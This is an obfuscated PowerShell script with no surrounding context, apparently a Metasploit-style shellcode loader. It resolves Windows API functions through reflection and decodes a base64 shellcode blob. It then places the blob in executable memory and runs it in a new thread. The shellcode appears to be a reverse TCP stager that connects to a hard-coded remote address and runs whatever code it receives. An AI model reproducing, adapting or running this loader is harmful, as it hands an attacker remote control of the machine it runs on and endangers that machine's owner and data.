function i67yTJr50 {
	Param ($kZYLHGgVrKmM, $h1pwG4TVeINi)		
	$bYM6XkP = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $bYM6XkP.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($bYM6XkP.GetMethod('GetModuleHandle')).Invoke($null, @($kZYLHGgVrKmM)))), $h1pwG4TVeINi))
}

function nepXnSS {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $rNftJVsma,
		[Parameter(Position = 1)] [Type] $yisqDBW = [Void]
	)
	
	$o3G0SL6Z4GG = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$o3G0SL6Z4GG.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $rNftJVsma).SetImplementationFlags('Runtime, Managed')
	$o3G0SL6Z4GG.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $yisqDBW, $rNftJVsma).SetImplementationFlags('Runtime, Managed')
	
	return $o3G0SL6Z4GG.CreateType()
}

[Byte[]]$tFMS = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCADhtrBuyC0FUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoFQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZu+AdKgpBidr/1Q==")
		
$pvYk = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((i67yTJr50 kernel32.dll VirtualAlloc), (nepXnSS @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $tFMS.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($tFMS, 0, $pvYk, $tFMS.length)

$jeIn1 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((i67yTJr50 kernel32.dll CreateThread), (nepXnSS @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$pvYk,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((i67yTJr50 kernel32.dll WaitForSingleObject), (nepXnSS @([IntPtr], [Int32]))).Invoke($jeIn1,0xffffffff) | Out-Null